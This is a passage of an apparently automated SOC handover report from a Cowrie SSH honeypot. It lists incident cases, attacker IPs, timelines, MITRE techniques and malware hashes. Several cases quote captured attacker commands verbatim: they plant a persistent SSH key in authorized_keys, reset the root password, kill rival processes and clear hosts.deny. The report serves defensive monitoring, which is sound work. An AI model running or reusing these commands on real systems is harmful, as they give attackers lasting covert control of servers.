| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:29:33` | `cowrie.session.connect` |
| `2026-03-14 09:29:33` | `cowrie.client.version` |
| `2026-03-14 09:29:33` | `cowrie.client.kex` |
| `2026-03-14 09:29:34` | `cowrie.login.success` |
| `2026-03-14 09:29:35` | `cowrie.session.params` |
| `2026-03-14 09:29:35` | `cowrie.command.input` |
| `2026-03-14 09:29:35` | `cowrie.command.failed` |
| `2026-03-14 09:29:35` | `cowrie.log.closed` |
| `2026-03-14 09:29:35` | `cowrie.session.params` |
| `2026-03-14 09:29:35` | `cowrie.command.input` |
| `2026-03-14 09:29:36` | `cowrie.session.file_download` |
| `2026-03-14 09:29:36` | `cowrie.log.closed` |
| `2026-03-14 09:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3b69b61b0c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:29 |
| **Last Seen** | 2026-03-14 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:29:39` | `cowrie.session.connect` |
| `2026-03-14 09:29:39` | `cowrie.client.version` |
| `2026-03-14 09:29:39` | `cowrie.client.kex` |
| `2026-03-14 09:29:40` | `cowrie.login.success` |
| `2026-03-14 09:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b628e7efd614

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:32 |
| **Last Seen** | 2026-03-14 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:32:13` | `cowrie.session.connect` |
| `2026-03-14 09:32:13` | `cowrie.client.version` |
| `2026-03-14 09:32:13` | `cowrie.client.kex` |
| `2026-03-14 09:32:14` | `cowrie.login.success` |
| `2026-03-14 09:32:15` | `cowrie.session.params` |
| `2026-03-14 09:32:15` | `cowrie.command.input` |
| `2026-03-14 09:32:15` | `cowrie.command.failed` |
| `2026-03-14 09:32:15` | `cowrie.log.closed` |
| `2026-03-14 09:32:16` | `cowrie.session.params` |
| `2026-03-14 09:32:16` | `cowrie.command.input` |
| `2026-03-14 09:32:16` | `cowrie.session.file_download` |
| `2026-03-14 09:32:16` | `cowrie.log.closed` |
| `2026-03-14 09:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba5e2bb62eb

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:32 |
| **Last Seen** | 2026-03-14 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:32:19` | `cowrie.session.connect` |
| `2026-03-14 09:32:19` | `cowrie.client.version` |
| `2026-03-14 09:32:19` | `cowrie.client.kex` |
| `2026-03-14 09:32:20` | `cowrie.login.success` |
| `2026-03-14 09:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d41bcc83713

| Field | Detail |
|---|---|
| **Source IP** | `116.113.254[.]26` |
| **First Seen** | 2026-03-14 12:52 |
| **Last Seen** | 2026-03-14 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 12:52:15` | `cowrie.session.connect` |
| `2026-03-14 12:52:17` | `cowrie.client.version` |
| `2026-03-14 12:52:17` | `cowrie.client.kex` |
| `2026-03-14 12:52:19` | `cowrie.login.success` |
| `2026-03-14 12:52:19` | `cowrie.direct-tcpip.request` |
| `2026-03-14 12:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.254[.]26` to AbuseIPDB if not already reported
- [ ] Block `116.113.254[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f985097e95b6

| Field | Detail |
|---|---|
| **Source IP** | `101.126.11[.]137` |
| **First Seen** | 2026-03-14 16:50 |
| **Last Seen** | 2026-03-14 16:50 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0utz7ZGRtmWA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 16:50:00` | `cowrie.session.connect` |
| `2026-03-14 16:50:00` | `cowrie.client.version` |
| `2026-03-14 16:50:00` | `cowrie.client.kex` |
| `2026-03-14 16:50:02` | `cowrie.login.success` |
| `2026-03-14 16:50:02` | `cowrie.session.params` |
| `2026-03-14 16:50:02` | `cowrie.command.input` |
| `2026-03-14 16:50:02` | `cowrie.command.failed` |
| `2026-03-14 16:50:02` | `cowrie.log.closed` |
| `2026-03-14 16:50:04` | `cowrie.session.params` |
| `2026-03-14 16:50:04` | `cowrie.command.input` |
| `2026-03-14 16:50:04` | `cowrie.session.file_download` |
| `2026-03-14 16:50:04` | `cowrie.log.closed` |
| `2026-03-14 16:50:20` | `cowrie.session.params` |
| `2026-03-14 16:50:20` | `cowrie.command.input` |
| `2026-03-14 16:50:21` | `cowrie.log.closed` |
| `2026-03-14 16:50:22` | `cowrie.session.params` |
| `2026-03-14 16:50:22` | `cowrie.command.input` |
| `2026-03-14 16:50:22` | `cowrie.log.closed` |
| `2026-03-14 16:50:23` | `cowrie.session.params` |
| `2026-03-14 16:50:23` | `cowrie.command.input` |
| `2026-03-14 16:50:23` | `cowrie.session.file_download` |
| `2026-03-14 16:50:23` | `cowrie.log.closed` |
| `2026-03-14 16:50:24` | `cowrie.session.params` |
| `2026-03-14 16:50:24` | `cowrie.command.input` |
| `2026-03-14 16:50:24` | `cowrie.log.closed` |
| `2026-03-14 16:50:25` | `cowrie.session.params` |
| `2026-03-14 16:50:25` | `cowrie.command.input` |
| `2026-03-14 16:50:25` | `cowrie.log.closed` |
| `2026-03-14 16:50:25` | `cowrie.session.params` |
| `2026-03-14 16:50:25` | `cowrie.command.input` |
| `2026-03-14 16:50:25` | `cowrie.command.input` |
| `2026-03-14 16:50:26` | `cowrie.log.closed` |
| `2026-03-14 16:50:27` | `cowrie.session.params` |
| `2026-03-14 16:50:27` | `cowrie.command.input` |
| `2026-03-14 16:50:27` | `cowrie.log.closed` |
| `2026-03-14 16:50:28` | `cowrie.session.params` |
| `2026-03-14 16:50:28` | `cowrie.command.input` |
| `2026-03-14 16:50:28` | `cowrie.log.closed` |
| `2026-03-14 16:50:28` | `cowrie.session.params` |
| `2026-03-14 16:50:28` | `cowrie.command.input` |
| `2026-03-14 16:50:29` | `cowrie.log.closed` |
| `2026-03-14 16:50:29` | `cowrie.session.params` |
| `2026-03-14 16:50:29` | `cowrie.command.input` |
| `2026-03-14 16:50:30` | `cowrie.log.closed` |
| `2026-03-14 16:50:30` | `cowrie.session.params` |
| `2026-03-14 16:50:30` | `cowrie.command.input` |
| `2026-03-14 16:50:30` | `cowrie.log.closed` |
| `2026-03-14 16:50:31` | `cowrie.session.params` |
| `2026-03-14 16:50:31` | `cowrie.command.input` |
| `2026-03-14 16:50:31` | `cowrie.log.closed` |
| `2026-03-14 16:50:32` | `cowrie.session.params` |
| `2026-03-14 16:50:32` | `cowrie.command.input` |
| `2026-03-14 16:50:33` | `cowrie.log.closed` |
| `2026-03-14 16:50:34` | `cowrie.session.params` |
| `2026-03-14 16:50:34` | `cowrie.command.input` |
| `2026-03-14 16:50:34` | `cowrie.log.closed` |
| `2026-03-14 16:50:35` | `cowrie.session.params` |
| `2026-03-14 16:50:35` | `cowrie.command.input` |
| `2026-03-14 16:50:36` | `cowrie.log.closed` |
| `2026-03-14 16:50:37` | `cowrie.session.params` |
| `2026-03-14 16:50:37` | `cowrie.command.input` |
| `2026-03-14 16:50:37` | `cowrie.log.closed` |
| `2026-03-14 16:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.11[.]137` to AbuseIPDB if not already reported
- [ ] Block `101.126.11[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459ce4dfd830

| Field | Detail |
|---|---|
| **Source IP** | `183.82.108[.]109` |
| **First Seen** | 2026-03-14 19:08 |
| **Last Seen** | 2026-03-14 19:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 19:08:16` | `cowrie.session.connect` |
| `2026-03-14 19:08:17` | `cowrie.client.version` |
| `2026-03-14 19:08:17` | `cowrie.client.kex` |
| `2026-03-14 19:08:18` | `cowrie.login.success` |
| `2026-03-14 19:08:18` | `cowrie.direct-tcpip.request` |
| `2026-03-14 19:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.108[.]109` to AbuseIPDB if not already reported
- [ ] Block `183.82.108[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2c30ebf04f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]51` |
| **First Seen** | 2026-03-14 19:17 |
| **Last Seen** | 2026-03-14 19:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 19:17:12` | `cowrie.session.connect` |
| `2026-03-14 19:17:12` | `cowrie.client.version` |
| `2026-03-14 19:17:12` | `cowrie.client.kex` |
| `2026-03-14 19:17:13` | `cowrie.login.success` |
| `2026-03-14 19:17:14` | `cowrie.session.params` |
| `2026-03-14 19:17:14` | `cowrie.command.input` |
| `2026-03-14 19:17:14` | `cowrie.log.closed` |
| `2026-03-14 19:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]51` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063dba07b89f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]51` |
| **First Seen** | 2026-03-14 19:31 |
| **Last Seen** | 2026-03-14 19:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 19:31:35` | `cowrie.session.connect` |
| `2026-03-14 19:31:36` | `cowrie.client.version` |
| `2026-03-14 19:31:36` | `cowrie.client.kex` |
| `2026-03-14 19:31:37` | `cowrie.login.success` |
| `2026-03-14 19:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]51` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a34364c8e7a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]51` |
| **First Seen** | 2026-03-14 19:46 |
| **Last Seen** | 2026-03-14 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 19:46:02` | `cowrie.session.connect` |
| `2026-03-14 19:46:02` | `cowrie.client.version` |
| `2026-03-14 19:46:02` | `cowrie.client.kex` |
| `2026-03-14 19:46:03` | `cowrie.login.success` |
| `2026-03-14 19:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]51` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.216.120[.]67` | **10** | 2026-03-14 16:46 | 2026-03-14 17:09 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.139.164[.]171` | **10** | 2026-03-14 11:13 | 2026-03-14 11:35 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.33.186[.]150` | **10** | 2026-03-14 05:51 | 2026-03-14 06:15 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.243.0[.]62` | **10** | 2026-03-14 09:07 | 2026-03-14 09:34 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **7** | 2026-03-14 17:33 | 2026-03-14 17:42 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-03-14 03:21 | 2026-03-14 03:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | **3** | 2026-03-14 16:50 | 2026-03-14 17:36 | 6m | 0 | `T1592` | 🟢 LOW |
| `134.199.151[.]94` | **2** | 2026-03-14 07:32 | 2026-03-14 07:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.196.233[.]120` | **2** | 2026-03-14 18:03 | 2026-03-14 18:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.32.174[.]108` | **2** | 2026-03-14 17:35 | 2026-03-14 17:38 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]72` | 1 | 2026-03-14 09:09 | 2026-03-14 09:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `111.53.23[.]141` | 1 | 2026-03-14 16:58 | 2026-03-14 16:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `115.73.11[.]44` | 1 | 2026-03-14 09:13 | 2026-03-14 09:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.242.152[.]189` | 1 | 2026-03-14 01:21 | 2026-03-14 01:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.48.109[.]59` | 1 | 2026-03-14 06:01 | 2026-03-14 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.154[.]88` | 1 | 2026-03-14 01:06 | 2026-03-14 01:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.24.162[.]1` | 1 | 2026-03-14 08:32 | 2026-03-14 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.42.177[.]4` | 1 | 2026-03-14 09:53 | 2026-03-14 09:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.191.151[.]51` | 1 | 2026-03-14 20:00 | 2026-03-14 20:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.165.112[.]228` | 1 | 2026-03-14 11:04 | 2026-03-14 11:04 | 14s | 0 | `T1592` | 🟢 LOW |
| `180.76.97[.]132` | 1 | 2026-03-14 07:45 | 2026-03-14 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-03-14 09:39 | 2026-03-14 09:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-03-14 16:39 | 2026-03-14 16:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.145[.]55` | 1 | 2026-03-14 17:18 | 2026-03-14 17:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `183.171.44[.]82` | 1 | 2026-03-14 08:22 | 2026-03-14 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.44[.]82` | 1 | 2026-03-14 17:08 | 2026-03-14 17:08 | 14s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]139` | 1 | 2026-03-14 15:22 | 2026-03-14 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.39.15[.]221` | 1 | 2026-03-14 17:37 | 2026-03-14 17:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-14 14:22 | 2026-03-14 14:22 | 14s | 0 | `T1592` | 🟢 LOW |
| `216.236.215[.]9` | 1 | 2026-03-14 13:24 | 2026-03-14 13:24 | 20s | 0 | `T1592` | 🟢 LOW |
| `223.48.1[.]189` | 1 | 2026-03-14 13:31 | 2026-03-14 13:31 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.112.31[.]230` | 1 | 2026-03-14 17:35 | 2026-03-14 17:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]47` | 1 | 2026-03-14 14:01 | 2026-03-14 14:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]59` | 1 | 2026-03-14 00:54 | 2026-03-14 00:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.92.51[.]186` | 1 | 2026-03-14 04:27 | 2026-03-14 04:27 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.154.211[.]39` | 1 | 2026-03-14 09:41 | 2026-03-14 09:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.222.159[.]179` | 1 | 2026-03-14 05:41 | 2026-03-14 05:42 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.165.112[.]228` | UA | Maxnet Ltd., Kharkiv | **100** ⚠️ | 3 |
| `183.82.108[.]109` | IN | ACT HYD | **100** ⚠️ | 2 |
| `183.171.44[.]82` | MY | Celcom Axiata Berhad | **100** ⚠️ | 2 |
| `49.124.153[.]59` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 13 |
| `78.154.211[.]39` | KW | Qualitynet Co. | **100** ⚠️ | 4 |
| `183.171.12[.]224` | MY | Celcom Axiata Berhad | **100** ⚠️ | 10 |
| `211.20.26[.]201` | TW | Data Communication Business Group, | **100** ⚠️ | 13 |
| `183.171.61[.]139` | MY | Celcom Axiata Berhad | **100** ⚠️ | 0 |
| `120.48.154[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 32 |
| `46.32.174[.]108` | AZ | Eurosel LLC | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (717 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 539 |
| AbuseIPDB score 12 below threshold 25 | 133 |
| AbuseIPDB score 14 below threshold 25 | 8 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 830 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 212 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 717 filtered (86.4%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 25 priority case(s) shown individually · 37 recon entry/entries in table (10 group(s) consolidating 61 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-14T20:26:13Z_
